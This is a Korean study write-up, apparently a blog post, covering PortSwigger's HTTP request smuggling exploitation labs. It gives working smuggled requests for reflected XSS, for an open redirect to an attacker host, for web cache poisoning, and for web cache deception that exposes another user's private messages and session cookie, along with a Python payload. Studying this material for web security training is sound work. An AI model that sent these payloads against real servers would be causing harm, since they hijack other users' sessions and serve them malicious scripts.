**HTTP request smuggling**에 취약하고 **reflected XSS**가 가능한 어플리케이션이 있으면, 다른 사용자를 공격할 때 **HTTP request smuggling**을 사용할 수 있습니다. 이런 공격방식은 그냥 **reflected XSS**만 사용하는 것보다 효과가 훨씬 강력합니다 :

- 사용자와 상호작용하는 게 필요 없습니다. 사용자에게 URL을 주고 방문할 때까지 기다릴 필요없이, XSS 페이로드를 담고 있는 요청과 다음 사용자의 정상적인 요청을 smuggle 하면 됩니다.
-  HTTP 요청 헤더같이 **reflected XSS**를 수행할 때 통제할 수 없는 지점까지 사용해서 XSS를 일으킬 수 있습니다.

예를 들어, `User-Agent` 헤더에 **reflected-XSS** 취약점이 있는 어플리케이션을 가정해봅시다. 그러면 request smuggling를 사용해 익스플로잇할 수 있습니다 :

``` http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

다음 사용자의 요청은 smuggle된 요청에 붙어서, XSS 페이로드가 포함된 응답을 받게 됩니다.

**Lab: Exploiting HTTP request smuggling to deliver reflected XSS**

**LAB Description**

Front-end, Back-end 서버로 이루어져있고 Front-end 서버는 chunked encoding을 지원하지 않습니다. 

`User-Agent` 헤더를 통한 **reflected XSS** 에 취약하고, 이 랩을 풀려면 다른 사용자가 `alert(1)`을 실행시키게 하면 됩니다.

**PAYLOAD :**

``` python
second_request  = b'GET /post?postId=5 HTTP/1.1\r\n'
second_request += b'Host: '+HOST.encode()+b'\r\n'
second_request += b'User-Agent:"/> <script>alert(1)</script>\r\n'
second_request += b'\r\n'
second_request += b'x=1'

first_request  = b'POST / HTTP/1.1\r\n'
first_request += b'Host: '+HOST.encode()+b'\r\n'
first_request += b'Content-Length: '+str(len(second_request)+5).encode()+b'\r\n'
first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
first_request += b'Transfer-Encoding: chunked\r\n'
first_request += b'\r\n'
first_request += b'0\r\n\r\n'
```

comment form을 보면 hidden 타입의 input 중에 `userAgent` 가 있습니다.

``` html
<input required="" type="hidden" name="userAgent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36">
```

요청의 `User-Agent` 헤더로부터 값을 가져오기 때문에 이 페이지를 방문할 때 `User-Agent` 값을 바꿔주면 **reflected XSS** 를 이용해 `alert(1)`을 실행할 수 있습니다.

### 😎 Using HTTP request smuggling to turn an on-site redirect into an open redirect

많은 어플리케이션들이 요청의 `Host`헤더에 redirect할 호스트를 넣어서 다른 URL로 on-site redirect를 수행합니다.

예 중에 하나가 Apache, IIS 웹 서버의 기본 동작인데, 끝에 슬래쉬를 붙이지 않고 폴더에 접근하려고 하면, 같은 폴더를 대상으로 슬래쉬를 붙여서 리다이렉트 시킵니다.

**Request :**

``` http
GET /home HTTP/1.1
Host: normal-website.com
```

 **Response :**

``` http
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

이런 동작이 평소에는 위험하지 않은 것 같지만,  request smuggling 공격을 사용해서 사용자의 요청을 다른 도메인으로 보내는 방식으로 익스플로잇할 수 있습니다. 예시를 봅시다 :

``` http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

smuggled된 요청이 공격자의 웹사이트로 리다이렉트를 발생시킵니다.

**Smuggled request :**

``` http
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```

**Response :**

``` http
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

원래 요청은 페이지에 포함된 자바스크립트 파일을 위한 것이었는데, 공격자의 웹사이트에 자바스크립트 파일을 만들어 놓으면 그 파일로 요청이 리다이렉트됩니다.

### 😎 Using HTTP request smuggling to perform web cache poisoning

앞 공격의 변형인데, **HTTP request smuggling**을 이용해서 **web cache poisoning** 공격이 가능함을 보여주고 있습니다. Front-end 기능 중 일부가 같은 요청에 대한 응답을 캐싱하고 있다면, off-site 리다이렉트를 통해 cache를 공격할 수 있습니다.  성공하면 공격당한 URL로 요청을 보내는 모든 사용자를 대상으로 공격할 수 있는 강력한 공격방법입니다.

예로, 공격자는 Front-end 서버에게 다음과 같은 요청을 보냅니다 :

``` http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```

smuggle된 요청은 Back-end 서버로부터 바로 이전 공격과 같은 응답을 밭습니다(off-site redirect). Front-end 서버는 `/static/include.js`로의 요청이 두 번째 요청이라고 생각하고 응답을 캐싱합니다 :

**Request :**

``` http
GET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```

**Response :**

``` http
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

다른 사용자가 같은 URL로 요청을 보내면, 모두 공격자의 웹사이트로 redirect됩니다.

**web cache poisning**에 대해 업로드했었는데 방법론에 대해 간단히 설명해주는 그림이 있어 가져왔습니다.

![](https://portswigger.net/cms/images/ec/b8/0d97faa475af-article-methodology-full-landscape.svg)

**Lab: Exploiting HTTP request smuggling to perform web cache poisoning**

**LAB Description :**

Front-end, Back-end 서버로 이루어져있고 Front-end 서버는 chunked encoding을 지원하지 않습니다. Front-end 서버는 특정 응답들을 캐싱하도록 설정되어 있습니다.

이 랩을 풀려면, request smuggling 공격을 사용해서 캐쉬를 오염시켜야 합니다. 그래서 Javascript 파일로의 요청이 exploit server로 리다이렉트되어야 하고 오염된 캐쉬는 `alert(document.cookie)`를 실행시켜야 합니다.

### 😎 Using HTTP request smuggling to perform web cache deception

web cache poisoning 공격과 비슷하지만 목적이 다릅니다.

- **web cache poisoning** 공격은 공격자가 어플리케이션으로 하여금 캐쉬에 악의적인 내용을 저장하게 합니다. 그리고 이 내용들은 캐쉬를 통해 다른 사용자에게 전달됩니다.
- **web cache deception** 공격은 공격자가 어플리케이션이 다른 사용자의 민감한 정보를 캐쉬에 저장하게 합니다. 그러면 공격자가 그 내용을 캐쉬에서 가져올 수 있습니다.

다음과 같이 공격자가 특정 유저만의 민감한 내용을 담은 요청을 smuggle할 수 있습니다.

``` http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X
```

다른 사용자가 다음 요청을 보내면 그 요청은 위의 요청에 붙게 되고 그 요청은 민감한 내용을 포함하고 있습니다 :

``` http
GET /private/messages HTTP/1.1
Foo: XGET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com
Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
...
```

Back-end 서버는 이 요청에 대해 정상적으로 응답합니다. 만들어진 요청을 보면 URL은 private message를 향하고 있지만 Cookie는 다른 사용자의 세션 정보를 담고 있습니다. Front-end 서버는 `/static/some-image.png`요청에 대해 이 응답을 캐싱합니다. 

**Request :**

``` http
GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com
```

**Response :**

``` http
HTTP/1.1 200 Ok
...
<h1>Your private messages</h1>
...
```

공격자는 `/static/some-image.png`를 방문해서 캐쉬로부터 다른 사용자의 민감한 정보를 얻을 수 있습니다.

주의할 점은 공격자는 캐싱될 민감한 정보의 URL을 모른다는 것입니다. 왜냐하면 smuggle된 요청이 제대로 동작하기만 하면 다른 사용자가 요청한 어떤 URL이든 가능하기 때문입니다. 그래서 많은 static 경로에 대해서 원하는 정보가 저장되었는지 확인해봐야 할 수도 있습니다.

### Reference

>🚀 [https://kimtruth.github.io/2020/05/24/defcon-28-uploooadit/](https://kimtruth.github.io/2020/05/24/defcon-28-uploooadit/)
>
>🚀 [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
>
>🚀 [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)

진실님의 블로그에서 많이 배웠습니다..